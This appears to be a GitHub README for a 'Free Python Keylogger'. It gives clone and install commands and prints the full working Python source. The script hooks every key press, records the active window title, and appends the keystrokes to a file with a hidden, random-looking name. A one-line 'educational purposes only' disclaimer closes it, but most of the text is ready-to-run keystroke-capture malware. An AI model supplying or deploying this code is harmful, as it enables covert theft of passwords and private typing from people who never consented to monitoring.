

# Free Python Keylogger

![🔑](https://github.githubassets.com/images/icons/emoji/unicode/1f511.png)

## Overview
This Python script logs key presses along with the title of the active window at the time of the key press. The logged data is saved to a file for later analysis.

## Features
- Logs each key press.
- Captures the title of the active window when a key is pressed.
- Saves the logged data to a specified file.

## Requirements
- Python 3.x
- `keyboard` library
- `pygetwindow` library

## Installation

1. **Clone the repository**:
    ```bash
    git clone https://github.com/adixon23w/keylogger.git
    cd keylogger
    ```

2. **Install dependencies**:
    ```bash
    pip install keyboard pygetwindow
    ```

## Usage

1. **Run the script**:
    ```bash
    python Keylogger.py
    ```

2. The script will start logging key presses and the active window titles. To stop the script, press `Ctrl+C`.

## Code Explanation

```python
import keyboard
import pygetwindow as gw

FILE_PATH = '.L3EgQar.txt'

def on_key_event(event):
    key = event.name
    active_window = gw.getActiveWindowTitle()
    with open(FILE_PATH, 'a') as file:
        file.write(f'm,{key} - {active_window}.\n')

keyboard.on_press(on_key_event)

try:
    keyboard.wait()
except KeyboardInterrupt:
    print("Program stopped.")
finally:
    keyboard.unhook_all()
```

### Key Components

- **`keyboard` library**: Used to capture key press events.
- **`pygetwindow` library**: Used to get the title of the active window.
- **`FILE_PATH`**: The path to the file where the log is saved.
- **`on_key_event` function**: Handles key press events, retrieves the active window title, and writes the data to the log file.
- **`keyboard.on_press(on_key_event)`**: Registers the `on_key_event` function to be called on each key press.
- **`keyboard.wait()`**: Waits indefinitely for key press events.
- **`try`/`except` block**: Ensures that the program can be gracefully stopped using `Ctrl+C`.


## Disclaimer
This script is intended for educational purposes only. Unauthorized use of a keylogger is illegal and unethical.
